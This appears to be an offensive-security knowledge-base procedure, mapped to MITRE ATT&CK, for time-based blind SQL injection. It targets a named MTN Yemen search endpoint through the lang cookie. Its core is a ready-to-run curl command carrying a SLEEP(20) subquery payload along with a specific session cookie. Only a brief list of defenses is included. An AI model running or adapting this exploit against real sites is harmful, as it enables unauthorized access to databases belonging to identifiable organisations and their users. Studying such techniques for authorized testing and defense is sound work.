---
id: proc-mtn-blind-sqli
tags:
  - blind-sqli
  - time-based
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/sqli-time-based-blind]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:10.194Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Perform-Time-Based-Blind-SQL-Injection

## Summary

This procedure exploits blind SQL injection using time delays via MySQL's SLEEP function in the lang cookie, confirming arbitrary SQL execution without visible output in the MTN Yemen search endpoint.

## Description

Blind SQLi occurs when no direct data is reflected; timing attacks infer execution by measuring response delays. The payload subqueries to sleep for 20 seconds, proving control in a MySQL backend. Useful for black-box testing where errors are suppressed.

## Requirements

1. Confirmed injection point from prior steps
2. Patience for timing measurements (use --max-time in curl)

## Defense

Defensive measures and detection strategies:

- Limit query execution time at database level
- Block subquery patterns in WAF
- Monitor for unusual response latencies

## Objectives

1. Induce measurable delay
2. Validate blind execution capability

## Instructions

### Step 1: Inject Sleep Payload

**Context**: URL-encode a subquery that sleeps if true, observing response time.

**Command** ([[commands/sqli-time-based-blind]]):
```bash
curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" \
  -H "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=%2b(select*from(select(sleep(20)))a)%2b; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1" \
  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" \
  --max-time 30
```

> Response should take ~20 seconds longer than baseline, confirming execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sqli-time-based-blind]]

## Tools Used


## Tags

- blind-sqli
- time-based
